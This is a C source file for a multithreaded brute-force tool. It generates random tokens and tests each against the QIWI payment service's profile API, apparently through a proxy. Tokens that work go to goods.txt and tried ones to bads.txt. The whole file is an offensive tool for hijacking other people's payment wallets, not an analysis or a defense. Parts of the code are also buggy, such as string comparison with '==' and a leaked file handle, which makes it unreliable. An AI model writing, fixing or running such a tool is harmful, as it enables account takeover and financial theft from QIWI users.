#include "headers/main.h"

int SaveDatas(char *action, char *data)
{
  if(action == "goods")
  {
    FILE *goods;
    goods = fopen("goods.txt", "ab");
    fputs(data, goods);
    fputs("\n", goods);
    fclose(goods);
    
    return 1;
  }
  else if(action == "bads")
  {
    FILE *bads;
    bads = fopen("bads.txt", "ab");
    fputs(data, bads);
    fputs("\n", bads);
    fclose(bads);
    
    return 1;
  }
  else
    return -1;
  
  return 0;
}

int CheckDublicateToken(char *token)
{
  FILE *bads;
  bads = fopen("bads.txt", "r");
  
  char buffer[64];
  
  while(fgets(buffer, sizeof(buffer), bads) != NULL)
  {
    buffer[strlen(buffer) - 1] = 0;
    if (strcmp(buffer, token) == 0)
    {
      fclose(bads);
      return 1;
    }
    else
      continue;
  }
  
  return 0;
}

char *GenerateNewToken()
{
  srand(time(NULL));
  
  char text[] = "1234567890abcdefghijklmnopqrstuvwxyz";
  int size = 32, len = size - 1, i = 0;
  
  char *token = malloc(size + 1);
  
  for(i = 0; i < len; ++i)
    token[i] = text[rand() % (sizeof text - 1)];
  
  token[i] = '\0';
  
  return token;
}

void *OpenStreamForBrute(void *data)
{  
  char *token = data;

  int qiwi_status = QiwiApiGetProfile(token);
  
  printf("-> CHECKING: %s\n", token);
  
  if(qiwi_status == 1)
    SaveDatas("goods", token);
    
  pthread_exit(0);
}

int MakeBrute()
{
  int ret;
  pthread_t thread[core.threads];
  
  while(1)
  {    
    for(int step = 1; step < core.threads; step++)
    {
      char *token;
      int token_status = 1;
      
      while(token_status == 1)
      {
        token = GenerateNewToken();
        
        if(CheckDublicateToken(token) == 0)
          token_status = 0;
        else
          continue;
      }
      
      SaveDatas("bads", token);
      
      ret = pthread_create(&thread[step], NULL, OpenStreamForBrute, token);
      
      if(ret == 1)
        printf("-> ERROR: cant create thread\n");
    }
    
    for(int step = 1; step < core.threads; step++)
    {
      ret = pthread_join(thread[step], NULL);
      
      if(ret == 1)
        printf("-> ERROR: cant join to thread\n");
    }
  }
    
  return 0;
}

int main(int argc, char **argv)
{ 
  for(int step = 0; step < argc; step++)
  {
    if(strstr(argv[step], "-proxy="))
    {
      char *fetcher = strtok(argv[step], "=");
      fetcher = strtok(NULL, "=");
      
      core.proxy = malloc(strlen(fetcher) + 1);
      strcpy(core.proxy, fetcher);
    }
    else if(strstr(argv[step], "-threads="))
    {
      char *fetcher = strtok(argv[step], "=");
      fetcher = strtok(NULL, "=");
      
      core.threads = atoi(fetcher);
    }
    else
    {
      core.proxy = NULL;
      core.threads = 1;
    }
  }
  
  printf("-> PROXY: %s\n", core.proxy);
  printf("-> THREADS: %d\n", core.threads);
  
  GetMyIpViaProxy(core.proxy);
  MakeBrute();
  
  return 0;
}
